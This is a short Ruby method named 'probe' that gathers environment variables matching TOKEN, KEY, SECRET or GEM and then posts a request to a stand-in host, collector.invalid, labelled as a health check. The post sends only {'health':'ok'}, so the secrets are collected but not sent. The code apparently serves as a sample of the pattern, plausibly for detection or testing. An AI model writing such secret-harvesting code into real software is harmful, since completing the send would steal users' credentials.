require 'json'
require 'net/http'
def probe
  blob = {
    'env' => ENV.to_h.select { |key, _| key =~ /TOKEN|KEY|SECRET|GEM/i },
    'files' => {}
  }
  body = JSON.generate({ 'health' => 'ok' })
  uri = URI('https://collector.invalid/probe')
  Net::HTTP.start(uri.host, uri.port, use_ssl: true) do |http|
    request = Net::HTTP::Post.new(uri)
    request.body = body
    http.request(request)
  end
end
